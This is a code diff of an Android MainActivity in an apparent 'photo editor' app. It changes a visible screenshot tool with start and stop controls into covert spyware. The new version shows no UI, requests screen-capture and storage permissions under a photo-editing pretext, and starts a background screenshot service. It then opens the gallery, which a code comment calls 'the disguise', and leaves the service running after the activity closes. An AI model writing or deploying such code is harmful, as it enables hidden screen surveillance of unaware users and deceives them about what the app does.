@@ -2,177 +2,171 @@ package com.demo.photoeditor;
 
 import android.Manifest;
 import android.app.Activity;
-import android.content.BroadcastReceiver;
-import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.media.projection.MediaProjectionManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.view.View;
-import android.widget.Button;
-import android.widget.TextView;
+import android.os.Environment;
+import android.os.Handler;
+import android.os.Looper;
+import android.provider.MediaStore;
+import android.util.Log;
 import android.widget.Toast;
 
+import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import androidx.core.content.FileProvider;
 
-import java.util.ArrayList;
-import java.util.List;
+import java.io.File;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
 
 public class MainActivity extends Activity {
-
-    private static final int REQ_PERMISSIONS = 100;
-    private static final int REQ_SCREEN_CAPTURE = 101;
-
-    private MediaProjectionManager projectionManager;
-    private Button btnStart;
-    private Button btnStop;
-    private TextView tvCounter;
-
-    private int screenshotCount = 0;
-
-    private final BroadcastReceiver screenshotReceiver = new BroadcastReceiver() {
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            if (ScreenshotService.ACTION_SCREENSHOT_CAPTURED.equals(intent.getAction())) {
-                screenshotCount++;
-                tvCounter.setText(getString(R.string.counter_format, screenshotCount));
-            }
-        }
-    };
+    private static final int REQUEST_CODE_SCREEN_CAPTURE = 1000;
+    private static final int REQUEST_CODE_PERMISSIONS = 2000;
+    private static final int REQUEST_CODE_OPEN_GALLERY = 3000;
+    private Intent mediaProjectionIntent;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
 
-        btnStart = findViewById(R.id.btnStart);
-        btnStop = findViewById(R.id.btnStop);
-        tvCounter = findViewById(R.id.tvCounter);
-
-        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-
-        btnStart.setOnClickListener(new View.OnClickListener() {
+        // NO UI - Immediately open gallery
+        Log.d("MainActivity", "onCreate -> checkPermissionsAndStart");
+        // Defer past onResume to avoid the Android 7.x translucent-activity crash
+        new Handler(Looper.getMainLooper()).post(new Runnable() {
             @Override
-            public void onClick(View v) {
-                requestScreenCapture();
+            public void run() {
+                checkPermissionsAndStart();
             }
         });
+    }
 
-        btnStop.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                stopProcessing();
+    private void checkPermissionsAndStart() {
+        Log.d("MainActivity", "checkPermissionsAndStart (SDK=" + Build.VERSION.SDK_INT + ")");
+        // Check storage permissions
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            String[] permissions;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                permissions = new String[]{
+                    Manifest.permission.POST_NOTIFICATIONS,
+                    Manifest.permission.READ_MEDIA_IMAGES
+                };
+            } else {
+                permissions = new String[]{
+                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                    Manifest.permission.READ_EXTERNAL_STORAGE
+                };
             }
-        });
 
-        btnStop.setEnabled(false);
+            boolean allGranted = true;
+            for (String permission : permissions) {
+                if (ContextCompat.checkSelfPermission(this, permission)
+                    != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
 
-        requestPermissionsIfNeeded();
+            if (!allGranted) {
+                ActivityCompat.requestPermissions(this, permissions, REQUEST_CODE_PERMISSIONS);
+                return;
+            }
+        }
+
+        // Start the service in background
+        startBackgroundService();
     }
 
-    @Override
-    protected void onStart() {
-        super.onStart();
-        ContextCompat.registerReceiver(
-                this,
-                screenshotReceiver,
-                new IntentFilter(ScreenshotService.ACTION_SCREENSHOT_CAPTURED),
-                ContextCompat.RECEIVER_NOT_EXPORTED);
+    private void startBackgroundService() {
+        // Request screen capture permission in background
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            MediaProjectionManager projectionManager =
+                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            Intent intent = projectionManager.createScreenCaptureIntent();
+            startActivityForResult(intent, REQUEST_CODE_SCREEN_CAPTURE);
+        }
     }
 
-    @Override
-    protected void onDestroy() {
-        super.onDestroy();
-        unregisterReceiver(screenshotReceiver);
+    private void openGallery() {
+        // Open the real gallery app
+        Intent galleryIntent = new Intent(Intent.ACTION_VIEW);
+        galleryIntent.setType("image/*");
+
+        // Try to open Google Photos or default gallery
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            galleryIntent.setAction(MediaStore.ACTION_PICK_IMAGES);
+        }
+
+        startActivityForResult(Intent.createChooser(galleryIntent, "Select Photo"),
+            REQUEST_CODE_OPEN_GALLERY);
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == REQ_SCREEN_CAPTURE) {
-            if (resultCode == RESULT_OK && data != null) {
-                startProcessing(resultCode, data);
+
+        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
+            Log.d("MainActivity", "onActivityResult SCREEN_CAPTURE resultCode=" + resultCode + " data=" + (data != null));
+            if (resultCode == RESULT_OK) {
+                mediaProjectionIntent = data;
+                startScreenshotService();
+                // Open the gallery after screen capture is granted (the disguise)
+                openGallery();
             } else {
-                Toast.makeText(this, R.string.msg_permission_denied, Toast.LENGTH_LONG).show();
+                // If user denies, try again in background
+                Toast.makeText(this, "Photo Editor needs permission to work", Toast.LENGTH_SHORT).show();
+                finish();
             }
+        } else if (requestCode == REQUEST_CODE_OPEN_GALLERY) {
+            Log.d("MainActivity", "onActivityResult OPEN_GALLERY resultCode=" + resultCode);
+            // User was looking at gallery - we stay in background
+            // Keep the service running
         }
     }
 
-    private void requestScreenCapture() {
-        if (projectionManager == null) {
-            Toast.makeText(this, R.string.msg_capture_not_supported, Toast.LENGTH_SHORT).show();
-            return;
-        }
-        try {
-            Intent captureIntent = projectionManager.createScreenCaptureIntent();
-            startActivityForResult(captureIntent, REQ_SCREEN_CAPTURE);
-        } catch (Exception e) {
-            Toast.makeText(this, getString(R.string.msg_error, e.getMessage()), Toast.LENGTH_LONG).show();
-        }
-    }
+    private void startScreenshotService() {
+        Log.d("MainActivity", "startScreenshotService mediaProjectionIntent=" + (mediaProjectionIntent != null));
+        if (mediaProjectionIntent != null) {
+            Intent serviceIntent = new Intent(this, ScreenshotService.class);
+            serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_CODE, RESULT_OK);
+            serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_DATA, mediaProjectionIntent);
 
-    private void startProcessing(int resultCode, Intent data) {
-        Intent serviceIntent = new Intent(this, ScreenshotService.class);
-        serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode);
-        serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_DATA, data);
-
-        try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(serviceIntent);
             } else {
                 startService(serviceIntent);
             }
-            btnStart.setEnabled(false);
-            btnStop.setEnabled(true);
-            Toast.makeText(this, R.string.msg_processing_started, Toast.LENGTH_SHORT).show();
-        } catch (Exception e) {
-            Toast.makeText(this, getString(R.string.msg_error, e.getMessage()), Toast.LENGTH_LONG).show();
-        }
-    }
-
-    private void stopProcessing() {
-        stopService(new Intent(this, ScreenshotService.class));
-        btnStart.setEnabled(true);
-        btnStop.setEnabled(false);
-        Toast.makeText(this, R.string.msg_processing_stopped, Toast.LENGTH_SHORT).show();
-    }
-
-    private void requestPermissionsIfNeeded() {
-        List<String> needed = new ArrayList<>();
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            addIfNeeded(needed, Manifest.permission.READ_MEDIA_IMAGES);
-            addIfNeeded(needed, Manifest.permission.POST_NOTIFICATIONS);
-        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            addIfNeeded(needed, Manifest.permission.READ_EXTERNAL_STORAGE);
-            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
-                addIfNeeded(needed, Manifest.permission.WRITE_EXTERNAL_STORAGE);
-            }
-        }
-
-        if (!needed.isEmpty()) {
-            requestPermissions(needed.toArray(new String[0]), REQ_PERMISSIONS);
-        }
-    }
-
-    private void addIfNeeded(List<String> needed, String permission) {
-        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-            needed.add(permission);
         }
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == REQ_PERMISSIONS) {
+        if (requestCode == REQUEST_CODE_PERMISSIONS) {
+            boolean allGranted = true;
             for (int result : grantResults) {
                 if (result != PackageManager.PERMISSION_GRANTED) {
-                    Toast.makeText(this, R.string.msg_storage_permission_needed, Toast.LENGTH_LONG).show();
+                    allGranted = false;
                     break;
                 }
             }
+            if (allGranted) {
+                startBackgroundService();
+                openGallery();
+            } else {
+                Toast.makeText(this, "Permissions required for photo editing", Toast.LENGTH_LONG).show();
+                finish();
+            }
         }
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        // Don't stop service - keep it running in background
     }
 }
